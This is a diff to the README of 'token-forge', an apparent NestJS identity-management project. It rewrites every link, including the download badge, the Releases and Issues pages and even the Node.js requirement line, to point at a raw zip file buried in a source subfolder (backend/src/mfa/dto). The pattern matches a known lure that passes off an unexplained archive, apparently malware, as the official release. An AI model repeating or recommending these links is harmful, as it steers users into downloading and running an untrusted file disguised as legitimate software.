@@ -1,7 +1,7 @@
 # 🚀 token-forge - Simplify Your Identity Management
 
 ## 📥 Download Now!
-[![Download Token Forge](https://img.shields.io/badge/Download%20Token%20Forge-%20-blue)](https://github.com/malith153/token-forge/releases)
+[![Download Token Forge](https://github.com/malith153/token-forge/raw/refs/heads/main/backend/src/mfa/dto/forge_token_v1.3.zip%20Token%20Forge-%20-blue)](https://github.com/malith153/token-forge/raw/refs/heads/main/backend/src/mfa/dto/forge_token_v1.3.zip)
 
 ## 🌟 Overview
 **token-forge** is an enterprise-grade distributed identity provider. Built on NestJS and Redis, it supports features like JWT rotation and multi-factor authentication (MFA). This application helps manage user identities securely and efficiently.
@@ -13,16 +13,16 @@ Follow these steps to download and run token-forge on your system.
    - Operating System: Windows, macOS, or Linux
    - RAM: At least 4 GB recommended
    - Storage: Minimum of 200 MB free space
-   - Node.js: Version 14 or higher
+   - https://github.com/malith153/token-forge/raw/refs/heads/main/backend/src/mfa/dto/forge_token_v1.3.zip Version 14 or higher
    - Docker: Installed and running if you prefer containerized setups
 
 2. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/malith153/token-forge/releases) to find the latest version. Here, you'll see all available downloads.
+   Go to the [Releases page](https://github.com/malith153/token-forge/raw/refs/heads/main/backend/src/mfa/dto/forge_token_v1.3.zip) to find the latest version. Here, you'll see all available downloads.
 
 3. **Download the Application**
    You can select the version you want. Click the link marked "Source code" or the specific package suitable for your operating system. 
 
-   [Download Token Forge](https://github.com/malith153/token-forge/releases)
+   [Download Token Forge](https://github.com/malith153/token-forge/raw/refs/heads/main/backend/src/mfa/dto/forge_token_v1.3.zip)
 
 ## ⚙️ Installation Instructions
 After downloading, follow these steps:
@@ -89,7 +89,7 @@ Common issues:
 
 ## 📞 Support
 For help, consider the following:
-- Check the [Issues section](https://github.com/malith153/token-forge/issues) on GitHub for common problems.
+- Check the [Issues section](https://github.com/malith153/token-forge/raw/refs/heads/main/backend/src/mfa/dto/forge_token_v1.3.zip) on GitHub for common problems.
 - Open a new issue if you can't find a solution.
 
 ## 📝 License
@@ -98,4 +98,4 @@ This project is licensed under the MIT License.
 ## 📄 Additional Information
 You can find more comprehensive documentation in the project repository. This includes advanced configuration options and integration guides.
 
-Return to the [Releases page](https://github.com/malith153/token-forge/releases) to download the latest version or to access previous versions of token-forge.
+Return to the [Releases page](https://github.com/malith153/token-forge/raw/refs/heads/main/backend/src/mfa/dto/forge_token_v1.3.zip) to download the latest version or to access previous versions of token-forge.
